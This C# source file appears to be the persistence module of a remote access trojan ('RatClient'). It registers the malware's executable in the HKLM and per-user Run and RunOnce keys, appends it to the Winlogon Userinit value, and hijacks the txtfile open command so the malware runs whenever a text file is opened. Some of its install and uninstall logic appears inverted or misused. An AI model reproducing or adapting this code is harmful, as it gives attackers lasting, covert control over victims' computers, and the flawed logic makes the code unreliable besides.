using Microsoft.Win32;
using System;



namespace RatClient.Persistence
{
    class Registrys
    {
        private static readonly string exec = $"\"{Info.CurrentexecutablePath}\"";
        private static readonly string localMachineRunPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private static readonly string logonUserRunPath = $@"{Info.UserInfo.userSid}\Software\Microsoft\Windows\CurrentVersion\Run";
        private static readonly string logonUserRunOncePath = $@"{Info.UserInfo.userSid}\Software\Microsoft\Windows\CurrentVersion\RunOnce";
        private static readonly string winlogonuserinitPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

        public static bool RunLocalMachine(string name, bool unreg = false, bool checker = false)
        {
            bool status = false;
            if (string.IsNullOrEmpty(name))
            {
                return status;
            }
            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default))
            {
                using (RegistryKey sub = key.OpenSubKey(localMachineRunPath, true))
                {
					if (sub != null)
					{
						if (unreg)
						{
							sub.DeleteSubKey(name);
						}
						else if (checker)
						{
							string current = (string)sub.GetValue(name);
							status = current == name || current.Contains(exec);
						}
						else
						{
							sub.SetValue(name, exec, RegistryValueKind.String);
						}
						status = true;
					}
				}
            }
            return status;
        }

       
        public static bool RunLogonUser(string name, bool unreg = false, bool checker = false)
        {
            bool status = false;
            if (string.IsNullOrEmpty(name))
            {
                return status;
            }
            try
            {
                using (RegistryKey key = Registry.Users)
                {
                    using (RegistryKey sub = key.OpenSubKey(logonUserRunPath, true))
                    {
                        if (sub != null)
                        {
                            if (unreg)
                            {
                                sub.DeleteSubKey(name);
                            }
                            else if (checker)
                            {
                                string current = (string)sub.GetValue(name);
                                status = current == name || current.Contains(exec);
                            }
                            else
                            {
								sub.SetValue(name, exec, RegistryValueKind.String);
							}
							status = true;
                        }
                    }
                }
            }
            catch { }
            return status;
        }

        public static bool WinLogonUserInit(bool unreg = false, bool checker = false) 
        {
            bool status = false;
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default))
                {
                    using (RegistryKey sub = key.OpenSubKey(winlogonuserinitPath, true))
                    {
                        if (sub != null)
                        {
                            string currentvalue = (string)sub.GetValue("USERINIT");
                            if (checker && currentvalue != null) 
                            {
                                status = currentvalue.Contains(exec);
                            }
                            else if (currentvalue != null)
                            {
                                string value;

								if (unreg)
                                {
                                   value = $"{currentvalue.Split(',')[0].Trim()},";

								}
                                else
                                {
									value = $"{currentvalue.Split(',')[0].Trim()},{exec}";
								}
                                sub.SetValue("USERINIT", value, RegistryValueKind.String);
                                status = true;
                            }
                        }
                    }
                }
            }
            catch { }
            return status;
        }

        public static bool PersistTxtfile(bool unreg = false) 
        {
            if(RegTools.IsPersistTxtfile())
            {
                return true;
            }
            RegTools.RemoveUserChoice();
            bool status = false; 
            try
            {
                using (RegistryKey key = Registry.ClassesRoot.OpenSubKey("txtfile\\shell\\open\\command", true))
                {
                    if (key != null)
                    {
                        string value;
                        if (unreg)
                        {
                            value = $"{exec} -ptxt \"%1\"";
                        }
                        else
                        {
                            value = "C:\\windows\\system32\\notepad.exe \"%1\"";
						}
                        key.SetValue(null, value, RegistryValueKind.String);
                        status = true;
                    }
                }
            }
            catch { }
            return status;
        }
    }
}

